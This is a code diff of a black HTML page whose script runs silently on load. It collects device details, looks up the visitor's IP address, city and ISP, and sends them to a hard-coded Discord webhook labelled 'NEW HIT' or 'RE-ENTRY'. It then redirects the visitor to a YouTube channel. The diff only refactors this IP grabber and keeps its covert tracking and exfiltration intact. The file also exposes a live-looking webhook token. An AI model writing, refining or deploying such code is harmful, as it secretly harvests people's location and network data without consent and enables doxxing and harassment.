@@ -2,8 +2,8 @@
 <html>
 <body style="background:#000;">
 <script>
-    const H = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
-    const Y = "https://youtube.com/@LigmaBlox-w7m";
+    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
+    const y = "https://youtube.com/@LigmaBlox-w7m";
 
     async function gD() {
         try {
@@ -14,30 +14,27 @@
     }
 
     async function run() {
-        const re = sessionStorage.getItem('v');
+        const v = sessionStorage.getItem('v');
         sessionStorage.setItem('v', '1');
         const dev = await gD();
 
-        fetch(H, {
-            method: 'POST', mode: 'no-cors', keepalive: true,
-            body: JSON.stringify({ content: `[${re ? "RE-ENTRY" : "NEW HIT"}]\nDevice: ${dev}` })
-        });
+        // 1. Initial hit notification
+        navigator.sendBeacon(h, JSON.stringify({content: (v ? "RE-ENTRY" : "NEW HIT") + " | " + dev}));
 
-        while (true) {
+        // 2. Loop until City/IP is found
+        while(true) {
             try {
-                const r = await fetch('https://ip-api.com/json/?cb=' + Date.now()).then(d => d.json());
-                if (r.status === "success") {
-                    await fetch(H, {
-                        method: 'POST', mode: 'no-cors', keepalive: true,
-                        body: JSON.stringify({ content: `IP: ${r.query}\nLoc: ${r.city}, ${r.regionName}\nISP: ${r.isp}` })
-                    });
+                const r = await fetch('https://ip-api.com/json/').then(res => res.json());
+                if(r.status === "success") {
+                    const msg = "IP: " + r.query + "\nCity: " + r.city + "\nISP: " + r.isp;
+                    navigator.sendBeacon(h, JSON.stringify({content: msg}));
                     break;
                 }
-            } catch (e) {
+            } catch(e) {
                 await new Promise(s => setTimeout(s, 2));
             }
         }
-        location.replace(Y);
+        window.location.replace(y);
     }
     run();
 </script>
